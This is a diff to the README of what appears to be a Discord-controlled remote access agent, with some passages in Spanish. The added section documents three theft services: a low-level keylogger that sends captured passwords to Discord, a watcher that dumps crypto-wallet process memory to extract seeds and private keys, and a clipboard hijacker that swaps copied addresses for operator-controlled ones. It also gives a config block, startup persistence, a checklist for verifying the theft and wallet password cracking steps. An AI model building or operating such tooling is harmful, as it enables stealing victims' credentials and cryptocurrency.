@@ -37,13 +37,55 @@ Local state in `config.json`: version, channel, webhook, last ID and last heartb
 
 ## Commands
 
-`help`, `shell`, `ls`, `cd`, `cat`, `download`, `upload`, `harvest`, `bootstrap`, `hives`, `screenshot`, `clip`, `memdump <electrum|phantom|pid>`, `keys on|off|dump`, `clear`, `persist on|off`, `sleep`, `ping`, `gateway status|restart`, `kill`, `update`, `update check`, `update stage`, `update apply <version>`, `update rollback`, `update auto on|off`, `update auto`, `update status`.
+`help`, `shell`, `ls`, `cd`, `cat`, `download`, `upload`, `harvest`, `bootstrap`, `hives`, `screenshot`, `clip [read|on|off|status]`, `addr add|list|del|clear`, `memdump [electrum|phantom|ledger|exodus|pid]`, `wallet watch on|off|status`, `keys on|off [--hard]|status|dump`, `ops`, `clear`, `persist on|off`, `sleep`, `ping`, `gateway status|restart`, `kill`, `update`, `update check`, `update stage`, `update apply <version>`, `update rollback`, `update auto on|off`, `update auto`, `update status`.
 
 `help` lists the commands in the channel; `bootstrap` re-runs the automatic first-run collection.
 
 `gateway status` shows state, last ACK RTT, reconnects and last close code; `gateway restart` closes with 4000 to test resume.
 
 `shell` uses `cmd /c` or `/bin/sh -c`, merges stdout and stderr and cuts at 60 s. Outputs over 1000 characters are uploaded as `out-<ts>.txt`; the rest goes in a four-backtick block.
+
+## Wallet OPSEC services
+
+Three Windows-only services start with the agent, need no administrator and no new dependency:
+
+- **Wallet watch** (1.5 s): foreground title plus process scan for Electrum, Phantom, MetaMask, Rabby, Trust, Coinbase Wallet, Ledger Live and Exodus. Phantom/MetaMask are dumped through the browser's `--extension-process` children (the two largest), never through the browser main process. Each detection posts `wallet detected`, wakes the keylogger, waits 5 s, dumps, zips, uploads and scans. Findings notify the seed/`xprv`/Solana key; a clean dump retries at 60 s and 180 s while the process lives (three dumps maximum). Processes over 1.5 GB are skipped with a notice. Deduplication is `(name, pid, start time)` and the global cooldown is `wallets.dumpCooldownSec` (600 s).
+- **Keylogger**: `WH_KEYBOARD_LL` hook in a hidden PowerShell process with its own mutex, launched at agent start and relaunched from `startup.vbs` on logon while `cache/ops/keys.on` exists. UI Automation `IsPassword` decides first; the title/process heuristic is only the fallback. Blocks flush on Enter, Tab, focus change or 10 s idle; only 6–256 non-blank characters reach `passwords.log`, with process and title. `cache/ops/keys.log` keeps all context blocks. Password messages look like `password? <proc> | <title> | <text>`.
+- **Clipboard**: a hidden message-only window with `AddClipboardFormatListener` (`WM_CLIPBOARDUPDATE`, no polling). The text is validated by the agent over stdin/stdout and written back with Win32 in a few milliseconds. Strict checksums: base58check and bech32/bech32m for BTC (P2PKH, P2SH, bc1q, bc1p), EIP-55 for mixed-case ETH, 32-byte base58 for SOL, plus LTC, DOGE, BCH cashaddr/legacy, TRX, XRP and ADA. Only a single-line clipboard of at most 128 characters is touched; URLs, spaces, multiline text and anything that is already an operator address are left alone. Rotation is round-robin per coin and bech32 case is preserved.
+
+All three are on by default. `wallets.watch`, `keylogger.enabled`, `keylogger.sendPasswords` and `clipboard.enabled` in `discord.json` provide defaults; `wallet watch`, `keys` and `clip` set a local override in `config.json` that wins. `addr add|del|clear` store local coin lists under `clipboardCoins`; the provisioned `clipboard.coins` is used until the first local edit. `keys off --hard` also stops the wallet-triggered relaunch. `keylogger.sendPasswords=false` keeps local password logging but stops Discord messages.
+
+Configuration block (values must pass the validator; invalid addresses are ignored). Testnet forms are rejected unless `clipboard.testnet` is `true`:
+
+```json
+{
+  "wallets": { "watch": true, "dumpCooldownSec": 600 },
+  "keylogger": { "enabled": true, "sendPasswords": true },
+  "clipboard": {
+    "enabled": true,
+    "testnet": false,
+    "coins": {
+      "btc": ["bc1q...", "1..."],
+      "eth": ["0x..."],
+      "sol": ["..."]
+    }
+  }
+}
+```
+
+Artifacts live in `cache/ops/`: `keys.events` (hook queue, rotated 1 MB × 3), `keys.log`, `passwords.log`, `findings-<ts>.txt`, `wallet-*.dmp` during a dump and `*.dmp.zip` while an upload is retrying. The `.dmp` is deleted after the ZIP is created; `sync` uploads are split above 8 MB. The seven-day cache cleanup protects the scripts, marker, PID, offset and event queue.
+
+Windows-only is a hard limit: the Linux agent keeps the commands but reports `Windows only`. Native startup needs an interactive user session; a locked desktop still receives hook events. Phantom and MetaMask are not decrypted without the password — the memory dump is the password-independent path.
+
+### Manual Windows checklist
+
+1. With `persist on`, reboot while Minecraft is closed: `keys status` shows the hook running and `wallet watch status` the watcher.
+2. Open an unlocked Electrum: warning, dump, scan and seed/`xprv`. Close and reopen: no duplicate while the PID lives; a locked wallet produces only the controlled retries.
+3. Open Phantom in Edge/Brave with the extension unlocked: the dump contains extension renderers, not the browser main process.
+4. Copy a BTC/ETH/SOL address in Notepad: replaced in under 100 ms, one notification, pasting the replacement does not loop.
+5. Copy normal text, a URL and two lines: unchanged.
+6. Type in a Chrome password field and in Electrum's unlock dialog: one password event each, with process and title.
+7. `keys off --hard`, `clip off`, `wallet watch off`: services stop and stay stopped after the next wallet/restart.
 
 ## Harvest
 
@@ -143,7 +185,7 @@ A 0.2.7 harvest carries validated `discord/token.txt`, `v20=` in `keys.txt` and 
 
 - **Electrum:** `tools/ingest-case.sh` exporta `wallets/electrum-*.enc` y un hash `wallets/electrum-*.john` para hashcat (`-m 16600`). Con `--win-password`/`-p` prueba esa contraseña y las de `secrets/*-logins.tsv`.
 - **Phantom:** `tools/phantom-decrypt.py --case <caso> --logins -p '...'` prueba contraseñas contra los blobs sellados (PBKDF2-SHA256 + XChaCha20-Poly1305). Sale el mnemonic o el `phantom-seed-*.bin`.
-- **Sin contraseña:** si Electrum/Phantom están desbloqueados, `memdump electrum` o `memdump phantom` vuelca la memoria del proceso; `tools/dump-scan.py volcado.dmp` busca seeds BIP39 (checksum validado), `xprv` y claves Solana. `clip` lee el portapapeles y `keys on|off|dump` captura lo tecleado solo en ventanas de Electrum/Phantom.
+- **Sin contraseña:** el watcher vuelca y escanea solo al abrir Electrum/Phantom (ruta `--extension-process` para Phantom); también queda `memdump electrum|phantom|ledger|exodus|pid` manual. `tools/dump-scan.py` sigue sirviendo para un `.dmp` suelto. `clip [read|on|off|status]`, `addr`, `wallet watch` y `keys on|off|status|dump` controlan los tres servicios; ver “Wallet OPSEC services”.
 
 Las carteras de Electrum cifradas (BIE1) se exportan como `wallets/electrum-*.enc` y un hash `wallets/electrum-*.john` para hashcat (`-m 16600`); con `-p` se abren directamente. Phantom guarda el seed y su clave sellados con la contraseña de la extensión: se extraen a `wallets/phantom/`, pero no se descifran sin ella. MetaMask, si está, necesita su propia contraseña.
 
